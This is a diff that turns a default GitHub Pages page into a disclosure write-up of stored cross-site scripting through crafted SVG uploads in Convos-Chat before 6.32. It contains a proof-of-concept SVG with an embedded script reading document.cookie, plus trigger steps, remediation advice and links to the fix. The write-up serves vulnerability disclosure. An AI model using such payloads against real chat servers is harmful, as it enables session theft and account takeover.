@@ -1,37 +1,47 @@
-## Welcome to GitHub Pages
+# Cross Site Scripting - Stored through crafted SVG file in Convos-Chat before 6.32
 
-You can use the [editor on GitHub](https://github.com/DEV696/Writeup/edit/main/docs/index.md) to maintain and preview the content for your website in Markdown files.
+Greeting Everyone ! Today In This Blog we will Explore XSS attack vector, Which Is Possible through SVG file Upload Functionality Due To Improper Validation Of file it got Executed to the Backend Server . 
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+How to Look for Stored XSS Using SVG upload
 
-### Markdown
+## Description
+Chat component was found vulnerable to unrestricted file upload and any malicious JavaScript execution can be performed.
+Stored cross-site scripting arises when an application receives data from an untrusted source and includes that data within its later HTTP responses in an unsafe way. 
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+## Impact
+This allow an attacker to steal user session ,account takeover ,redirect user to attacker controlled site Javascript execution leads to multiple possible attack scenarios.
 
-```markdown
-Syntax highlighted code block
+## Proof Of Concept
+Step 1: Download the package/product from github repository https://github.com/convos-chat/convos and configure on localhost as per instruction.
+Step 2: Login into the application with valid credentials.
+Step 3: Navigate to chat and upload a svg file via upload functionality with below malicious JavaScript payload in it.
 
-# Header 1
-## Header 2
-### Header 3
+```<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
 
-- Bulleted
-- List
-
-1. Numbered
-2. List
-
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
+   <script type="text/javascript">
+      alert(document.cookie);
+   </script>
+</svg>
 ```
 
-For more details see [Basic writing and formatting syntax](https://docs.github.com/en/github/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax).
+Step 4: Once the file is uploaded click on generated link to access the file and observe the uploaded file and JavaScript payload execution.
 
-### Jekyll Themes
+## Which End Point Are Vulnerable :
 
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/DEV696/Writeup/settings/pages). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
+Profile Picture Upload
+File Upload On Another Functionality
+File Upload through Comment Section
 
-### Support or Contact
+## Remediation
+1) Ensure that the file’s content is validated properly and input sanitization is performed.
+2) Make sure a strict check against file extensions is implemented and a whitelisted is used to allow only required filetypes.
+3) Make sure that the file size limit is properly validated and large files are not processed by the application.
+4) Ensure that the injection points such as filename parameters are properly validated and sanitized in order to prevent client-side and     server-side injection attacks.
 
-Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://support.github.com/contact) and we’ll help you sort it out.
+## Reference Links
+Product url: https://github.com/convos-chat/convos
+https://github.com/convos-chat/convos/issues/623
+Released Fix: https://github.com/convos-chat/convos/commit/14a3b1e98cd1a3211c0ef3d4f5ffdbc60baaca54
